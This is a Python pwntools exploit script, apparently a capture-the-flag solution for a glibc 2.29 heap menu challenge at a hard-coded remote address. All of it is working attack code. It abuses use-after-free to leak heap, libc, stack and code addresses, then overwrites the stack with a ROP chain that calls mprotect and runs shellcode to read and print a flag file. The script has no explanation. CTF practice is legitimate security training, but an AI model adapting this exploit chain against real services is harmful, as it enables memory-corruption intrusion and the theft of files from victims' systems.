from pwn import *

context.arch = 'amd64'

###Util
def create(idx,data):
    r.sendlineafter('> ','1')
    r.sendlineafter('idx: ',str(idx))
    r.sendafter('name: ',data)

def edit(idx,data):
    r.sendlineafter('>','2')
    r.sendlineafter('idx: ',str(idx))
    r.sendafter('name: ',data)

def show(idx):
    r.sendlineafter('> ','3')
    r.sendlineafter('idx: ',str(idx))
    return r.recvuntil('\n########',drop=True)[11:]

def delete(idx):
    r.sendlineafter('> ','4')
    r.sendlineafter('idx: ',str(idx))
   
def special(data):
    r.sendlineafter('> ','50056')
    r.send(data)
    r.recvline()
    r.recvline()
    return r.recvline()[:-1]

###Addr
main_arena_offset = 0x1e4c40
unsorted_bin_offset = main_arena_offset+0x60
environ_offset = 0x1e7d60
csu_init_offset = 0x1f60
bss_offset = 0x4000

###ROPgadget
#  libc2.29
L_pop_rdi = 0x26542
L_pop_rsi = 0x26f9e
L_pop_rdx = 0x12bda6
L_pop_rax = 0x47cf8
L_leave = 0x58373
L_syscall = 0xcf6c5

###Exploit
r = remote('52.198.120.1',48763)
create(2,'a'*0x388)
create(0,'a'*0x388)
create(1,'a'*0x388)
delete(0)
delete(1)
heap_addr = u64(show(1).ljust(8,b'\x00'))-0x250-0x390-0x10
print(hex(heap_addr))
create(0,'a'*0x398)
delete(0)
for i in range(3):
    create(0,'a'*0x3a8)
    delete(0)
for i in range(7):
    create(0,b'a'*0x88)
    delete(0)
for i in range(7):
    create(0,b'a'*0x217)
    delete(0)
for i in range(5):
    create(0,b'a'*0x388)
    delete(0)
delete(2)
unsorted_bin_addr = u64(show(2)+b'\x00\x00')
libc_base = unsorted_bin_addr-unsorted_bin_offset
print(hex(libc_base))
create(0,b'a'*0xe8)
create(0,b'a'*0xf8)
create(1,b'a'*0x88)
edit(2,b'a'*0xe8+p64(0x101)+b'a'*0xf8+p64(0x21)+b'a'*0x18+p64(0x21))
delete(1)
edit(2,b'a'*0xe8+p64(0x101)+b'a'*0xf8+p64(0x31)+b'a'*0x28+p64(0x21))
delete(1)
edit(2,b'a'*0xe0+p64(0x300)+p64(0x90)+b'a'*0x88+p64(0x71)+b'a'*0x68+p64(0x91)+p64(0)*2+p64(heap_addr+0x40)*2)
delete(0)

create(2,b'a'*0x388)

edit(2,b'\x00'*0x100+p64(libc_base+environ_offset-1))
stack_addr = u64(special('a')[1:]+b'\x00\x00')-0xf8
print(hex(stack_addr))

create(0,b'a'*0x217)
delete(0)
edit(2,b'\x00'*0x100+p64(stack_addr-1))
csu_init_addr = u64(special('a')[1:]+b'\x00\x00')
code_base = csu_init_addr-csu_init_offset
print(hex(code_base))

ROPchain = p64(libc_base+L_pop_rdi)+p64(code_base+bss_offset)+\
           p64(libc_base+L_pop_rsi)+p64(0x1000)+\
           p64(libc_base+L_pop_rdx)+p64(7)+\
           p64(libc_base+L_pop_rax)+p64(10)+\
           p64(libc_base+L_syscall)+\
           p64(code_base+bss_offset+0x880)
#argument = b'/proc/self/maps'.ljust(0x30,b'\x00')
argument = b'/home/ctf/flag'.ljust(0x30,b'\x00')
shellcode = asm(f'''
                mov rdi, {code_base+bss_offset+0x850}
                mov rsi, 0
                mov rdx, 0
                mov rax, 2
                syscall

                mov rdi, 3
                mov rsi, {code_base+bss_offset}
                mov rdx, 0x200
                mov rax, 0
                syscall

                mov rdi, 1
                mov rsi, {code_base+bss_offset}
                mov rdx, 0x200
                mov rax, 1
                syscall
                hlt
                ''')
payload = ROPchain+argument+shellcode
print(hex(len(payload)))
create(0,b'a'*0x217)
delete(0)
edit(2,b'\x00'*0x100+p64(code_base+bss_offset+0x800))
special(payload)


fake_rbp = p64(code_base+bss_offset+0x800-8)
ROPchain = p64(libc_base+L_leave)
payload = fake_rbp+ROPchain
create(0,b'a'*0x217)
delete(0)
edit(2,b'\x00'*0x100+p64(stack_addr-0x20))
special(payload)
r.interactive()
